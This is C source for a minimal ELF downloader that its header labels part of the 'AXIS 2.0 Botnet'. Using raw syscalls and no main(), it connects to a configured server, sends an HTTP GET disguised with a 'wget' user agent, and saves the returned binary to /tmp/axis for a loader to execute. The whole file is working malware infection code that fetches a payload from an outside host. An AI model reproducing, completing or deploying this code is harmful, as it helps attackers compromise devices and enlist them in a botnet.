/*
 * Minimal ELF Downloader - Direct syscall implementation
 * AXIS 2.0 Botnet
 */

#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#include "dlr.h"

/* Direct syscall wrappers */
static int xsocket(int domain, int type, int protocol) {
    return syscall(__NR_socket, domain, type, protocol);
}

static int xconnect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    return syscall(__NR_connect, sockfd, addr, addrlen);
}

static ssize_t xread(int fd, void *buf, size_t count) {
    return syscall(__NR_read, fd, buf, count);
}

static ssize_t xwrite(int fd, const void *buf, size_t count) {
    return syscall(__NR_write, fd, buf, count);
}

static int xopen(const char *pathname, int flags) {
    return syscall(__NR_open, pathname, flags, 0644);
}

static int xclose(int fd) {
    return syscall(__NR_close, fd);
}

static void x_exit(int status) {
    syscall(__NR_exit, status);
}

/* Get architecture string */
static char *get_arch(void) {
    /* This would normally read from /etc/ or use uname */
    /* For minimal size, we use a simple approach */
    return "unknown";
}

/* Download and execute */
static void run(void) {
    int fd, out;
    struct sockaddr_in addr;
    char buf[1024];
    char request[512];
    char *arch = get_arch();
    
    /* Create output file */
    out = xopen("/tmp/axis", O_WRONLY | O_CREAT | O_TRUNC);
    if (out == -1) {
        x_exit(1);
    }
    
    /* Create socket */
    fd = xsocket(AF_INET, SOCK_STREAM, 0);
    if (fd == -1) {
        x_exit(1);
    }
    
    /* Connect to server */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT);
    addr.sin_addr.s_addr = inet_addr(HTTP_SERVER);
    
    if (xconnect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        x_exit(1);
    }
    
    /* Send HTTP GET request */
    int len = 0;
    len += __builtin_sprintf(request + len, "GET %s.%s HTTP/1.0\r\n", DLR_PATH, arch);
    len += __builtin_sprintf(request + len, "Host: %s\r\n", HTTP_SERVER);
    len += __builtin_sprintf(request + len, "User-Agent: wget\r\n");
    len += __builtin_sprintf(request + len, "Connection: close\r\n\r\n");
    
    xwrite(fd, request, len);
    
    /* Read response and write to file */
    int header_done = 0;
    while (1) {
        int n = xread(fd, buf, sizeof(buf));
        if (n <= 0) break;
        
        /* Skip HTTP headers */
        if (!header_done) {
            char *body = __builtin_memmem(buf, n, "\r\n\r\n", 4);
            if (body != NULL) {
                int body_len = n - (body - buf) - 4;
                if (body_len > 0) {
                    xwrite(out, body + 4, body_len);
                }
                header_done = 1;
            }
        } else {
            xwrite(out, buf, n);
        }
    }
    
    xclose(fd);
    xclose(out);
    
    /* Execute downloaded binary */
    /* The caller (shell/loader) will execute it */
    x_exit(0);
}

/* Entry point - no main() to reduce size */
void __attribute__((section(".text"))) _start(void) {
    run();
    x_exit(0);
}
